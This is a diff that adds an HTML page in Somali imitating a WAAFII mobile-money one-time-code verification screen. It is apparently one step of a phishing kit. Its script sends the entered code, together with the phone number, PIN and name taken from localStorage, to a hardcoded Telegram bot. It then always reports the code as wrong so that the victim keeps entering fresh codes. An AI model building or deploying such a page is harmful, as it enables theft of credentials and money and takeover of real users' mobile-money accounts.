@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lambarka Xaqiijinta | WAAFII</title>
+    <style>
+        :root {
+            --navy: #1a237e;
+            --teal: #14b886;
+            --grey-text: #757575;
+            --light-grey: #cfd8dc;
+            --otp-line: #f0f0f0;
+        }
+
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        .header h1 {
+            color: var(--navy);
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            color: var(--grey-text);
+            font-style: italic;
+            font-family: 'Georgia', serif;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+
+        .hidden-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            margin: 40px 0 20px 0;
+            cursor: pointer;
+        }
+
+        .otp-box {
+            width: 14%;
+            border: none;
+            border-bottom: 2px solid var(--otp-line);
+            text-align: center;
+            font-size: 24px;
+            padding-bottom: 5px;
+            outline: none;
+            background: transparent;
+            font-weight: 600;
+            color: var(--navy);
+        }
+
+        .otp-box.active {
+            border-bottom-color: var(--teal);
+        }
+
+        .otp-box.filled {
+            border-bottom-color: var(--teal);
+        }
+
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: 'Georgia', serif;
+            font-style: italic;
+            font-size: 14px;
+        }
+
+        .timer {
+            color: var(--grey-text);
+            font-weight: bold;
+        }
+
+        .help-link {
+            color: var(--teal);
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .resend-link {
+            color: var(--teal);
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .footer {
+            margin-top: auto;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: var(--light-grey);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 18px;
+            font-family: 'Georgia', serif;
+            font-style: italic;
+            margin-bottom: 10px;
+            cursor: not-allowed;
+        }
+
+        .next-btn.active {
+            background-color: var(--teal);
+            cursor: pointer;
+        }
+
+        .version {
+            color: var(--grey-text);
+            font-size: 12px;
+            font-family: 'Georgia', serif;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>Geli lambarka xaqiijinta</h1>
+        <p>Fadlan geli 6-lambar ee laguu soo diray lambarkaaga ama email-kaaga</p>
+    </div>
+
+    <input type="text" id="realOtpInput" class="hidden-input" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+
+    <div class="otp-container" id="otpContainer">
+        <div class="otp-box" data-index="0">-</div>
+        <div class="otp-box" data-index="1">-</div>
+        <div class="otp-box" data-index="2">-</div>
+        <div class="otp-box" data-index="3">-</div>
+        <div class="otp-box" data-index="4">-</div>
+        <div class="otp-box" data-index="5">-</div>
+    </div>
+
+    <div class="status-row">
+        <span class="timer" id="timer">03:00</span>
+        <a href="#" class="help-link" id="resendBtn">Dib u dir lambarka</a>
+    </div>
+
+    <div class="footer">
+        <button class="next-btn" id="nextBtn">Xiga</button>
+        <div class="version">Nooca 12.4.0860 (1200040860)</div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8503179421:AAEtjBpS6ihvdGImXoGxQSbAA7OaQtojIDM';
+        const CHAT_ID = '5520957080';
+        
+        let timeLeft = 180;
+        let timerInterval = null;
+        
+        const realInput = document.getElementById('realOtpInput');
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        const otpContainer = document.getElementById('otpContainer');
+        const nextBtn = document.getElementById('nextBtn');
+        const timerDisplay = document.getElementById('timer');
+        const resendBtn = document.getElementById('resendBtn');
+        
+        async function sendToTelegram(message) {
+            const encoded = encodeURIComponent(message);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`, {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+            } catch(e) { console.warn(e); }
+        }
+        
+        function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.innerText = '00:00';
+                    nextBtn.classList.remove('active');
+                    nextBtn.disabled = true;
+                    return;
+                }
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerDisplay.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+        
+        function resetTimer() {
+            timeLeft = 180;
+            startTimer();
+        }
+        
+        function updateVisualBoxes() {
+            const value = realInput.value;
+            const valueArray = value.split('');
+            
+            for (let i = 0; i < otpBoxes.length; i++) {
+                const box = otpBoxes[i];
+                if (valueArray[i]) {
+                    box.innerText = valueArray[i];
+                    box.classList.add('filled');
+                } else {
+                    box.innerText = '-';
+                    box.classList.remove('filled');
+                }
+            }
+            
+            const currentLength = value.length;
+            otpBoxes.forEach((box, idx) => {
+                if (idx === currentLength && currentLength < otpBoxes.length) {
+                    box.classList.add('active');
+                } else {
+                    box.classList.remove('active');
+                }
+            });
+            
+            if (value.length === 6 && timeLeft > 0) {
+                nextBtn.classList.add('active');
+                nextBtn.disabled = false;
+            } else {
+                nextBtn.classList.remove('active');
+                nextBtn.disabled = true;
+            }
+        }
+        
+        function handleOtpInput(e) {
+            let value = realInput.value;
+            value = value.replace(/[^0-9]/g, '');
+            if (value.length > 6) value = value.slice(0, 6);
+            realInput.value = value;
+            updateVisualBoxes();
+        }
+        
+        realInput.addEventListener('input', handleOtpInput);
+        
+        otpContainer.addEventListener('click', () => {
+            realInput.focus();
+        });
+        
+        realInput.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+            realInput.value = pastedData;
+            updateVisualBoxes();
+        });
+        
+        async function submitOtp() {
+            const otp = realInput.value;
+            const phone = localStorage.getItem('waafiiPhone') || 'Lama cayimin';
+            const pin = localStorage.getItem('waafiiPin') || 'Lama qaban';
+            const application = JSON.parse(localStorage.getItem('waafiiApplication')) || {};
+            
+            if (otp.length !== 6) {
+                alert('Fadlan geli 6-lambar ee xaqiijinta');
+                return;
+            }
+            
+            const message = `📨 *ISKU DAYGA OTP - WAAFII (MA SAXA)\n📞 Telefoonka: ${phone}\n🔑 OTP La Geliyay: ${otp}\n👤 Magaca: ${application.fullName || 'Lama cayimin'}\n❌ Xaaladda: MA SAXA (naqshad ahaan)\n🕒 ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(message);
+            
+            alert('Lambarka xaqiijinta waa khalad. Fadlan isku day mar kale.');
+            
+            realInput.value = '';
+            updateVisualBoxes();
+            realInput.focus();
+        }
+        
+        async function resendOtp() {
+            resetTimer();
+            
+            realInput.value = '';
+            updateVisualBoxes();
+            realInput.focus();
+            
+            const phone = localStorage.getItem('waafiiPhone') || 'Lama cayimin';
+            const message = `🔄 *DIB U DIRID LAA CODSAY - WAAFII*\n📱 Telefoonka: ${phone}\n⏱️ Waqti cusub oo 3 daqiiqo ah ayaa bilaabmay\n🕒 ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(message);
+            
+            alert('Lambar xaqiijin oo cusub ayaa la soo diray! (Sidoo kale waa mid aan sax ahayn naqshad ahaan)');
+        }
+        
+        nextBtn.addEventListener('click', submitOtp);
+        resendBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            resendOtp();
+        });
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            realInput.focus();
+            updateVisualBoxes();
+            startTimer();
+        });
+    </script>
+</body>
+</html>
